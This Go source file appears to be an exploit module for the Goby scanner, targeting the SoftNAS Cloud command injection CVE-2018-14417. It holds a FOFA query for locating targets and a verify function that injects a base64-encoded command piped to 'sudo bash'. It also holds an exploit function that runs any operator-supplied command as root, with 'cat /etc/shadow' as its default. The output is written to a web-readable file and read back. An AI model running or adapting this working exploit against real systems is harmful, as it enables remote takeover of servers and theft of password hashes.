package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SoftNAS system snserv.php RCE (CVE-2018-14417)",
    "Description": "SoftNASCloud® is a data control and management platform. The recentVersions parameter of the system /softnas/snserver/snserv.php file has a remote command execution vulnerability, and the attacker can execute arbitrary system commands.",
    "Impact": "SoftNAS system snserv.php RCE (CVE-2018-14417)",
    "Recommendation": "<p>1. Strictly filter the data entered by the user and prohibit the execution of system commands.</p><p>2. Upgrade to the latest version</p><p>Official website address: <a href=\"https://www.softnas.com\">https://www.softnas.com</a></p>",
    "Product": "SoftNAS Cloud < 4.0.3",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "SoftNAS数据控制管理平台4.03版本snserv.php文件recentVersions参数远程命令执行漏洞",
            "Description": "SoftNASCloud®是一个数据控制和管理平台，该系统/softnas/snserver/snserv.php文件recentVersions参数存在远程命令执行漏洞，攻击者可执行任意系统命令",
            "Impact": "<p>黑客可在服务器上执行任意命令，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。</p>",
            "Recommendation": "<p>一、严格过滤用户输入的数据，禁止执行系统命令。</p><p>二、升级至最新版</p><p>官网地址：<a href=\"https://www.softnas.com\" rel=\"nofollow\">https://www.softnas.com</a><br></p>",
            "Product": "SoftNAS",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "SoftNAS system snserv.php RCE (CVE-2018-14417)",
            "Description": "SoftNASCloud® is a data control and management platform. The recentVersions parameter of the system /softnas/snserver/snserv.php file has a remote command execution vulnerability, and the attacker can execute arbitrary system commands.",
            "Impact": "SoftNAS system snserv.php RCE (CVE-2018-14417)",
            "Recommendation": "<p>1. Strictly filter the data entered by the user and prohibit the execution of system commands.</p><hr><p>2. Upgrade to the latest version</p><hr><p>Official website address: <a href=\"https://www.softnas.com\">https://www.softnas.com</a></p><hr>",
            "Product": "SoftNAS Cloud < 4.0.3",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"url=/softnas/\" || title=\"SoftNAS\"",
    "GobyQuery": "body=\"url=/softnas/\" || title=\"SoftNAS\"",
    "Author": "atdpa4sw0rd@gmail.com",
    "Homepage": "https://www.softnas.com",
    "DisclosureDate": "2021-05-26",
    "References": [
        "https://www.exploit-db.com/exploits/45097/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2018-14417"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201808-115"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/shadow",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10242"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg_get := httpclient.NewGetRequestConfig("/softnas/snserver/snserv.php?opcode=checkupdate&opcode=executeupdate&selectedupdate=4.0.1aaaaaaa.1aaaaaaaaaaaaaa&update_type=standard&recentVersions=4.0.3aaaaaaaaaaa.1aaaaaaa;echo+Y2htb2QgNzU1IC92YXIvd3d3L3NvZnRuYXMvaW1hZ2VzIDsgaWQgPiAvdmFyL3d3dy9zb2Z0bmFzL2ltYWdlcy92dWwxMy50eHQ=+%7C+base64+-d+%7C+sudo+bash;")
			cfg_get.VerifyTls = false
			httpclient.DoHttpRequest(u, cfg_get)
			cfg_res := httpclient.NewGetRequestConfig("/softnas/images/vul13.txt")
			cfg_res.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(u, cfg_res)
			cfg_rm := httpclient.NewGetRequestConfig("/softnas/snserver/snserv.php?opcode=checkupdate&opcode=executeupdate&selectedupdate=4.0.1aaaaaaa.1aaaaaaaaaaaaaa&update_type=standard&recentVersions=4.0.3aaaaaaaaaaa.1aaaaaaa;echo+cm0gLWYgL3Zhci93d3cvc29mdG5hcy9pbWFnZXMvdnVsMTMudHh0+%7C+base64+-d+%7C+sudo+bash;")
			cfg_rm.VerifyTls = false
			httpclient.DoHttpRequest(u, cfg_rm)
			if err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, "uid="))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cmd_r := "chmod 755 /var/www/softnas/images ; " + cmd + " > /var/www/softnas/images/vul13.txt"
			strbytes := []byte(cmd_r)
			cmd_en := base64.StdEncoding.EncodeToString(strbytes)
			uri := "/softnas/snserver/snserv.php?opcode=checkupdate&opcode=executeupdate&selectedupdate=4.0.1aaaaaaa.1aaaaaaaaaaaaaa&update_type=standard&recentVersions=4.0.3aaaaaaaaaaa.1aaaaaaa;echo+" + cmd_en + "+%7C+base64+-d+%7C+sudo+bash;"
			cfg_get := httpclient.NewGetRequestConfig(uri)
			cfg_get.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg_get)
			cfg_res := httpclient.NewGetRequestConfig("/softnas/images/vul13.txt")
			cfg_res.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_res)
			cfg_rm := httpclient.NewGetRequestConfig("/softnas/snserver/snserv.php?opcode=checkupdate&opcode=executeupdate&selectedupdate=4.0.1aaaaaaa.1aaaaaaaaaaaaaa&update_type=standard&recentVersions=4.0.3aaaaaaaaaaa.1aaaaaaa;echo+cm0gLWYgL3Zhci93d3cvc29mdG5hcy9pbWFnZXMvdnVsMTMudHh0+%7C+base64+-d+%7C+sudo+bash;")
			cfg_rm.VerifyTls = false
			httpclient.DoHttpRequest(expResult.HostInfo, cfg_rm)
			if err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
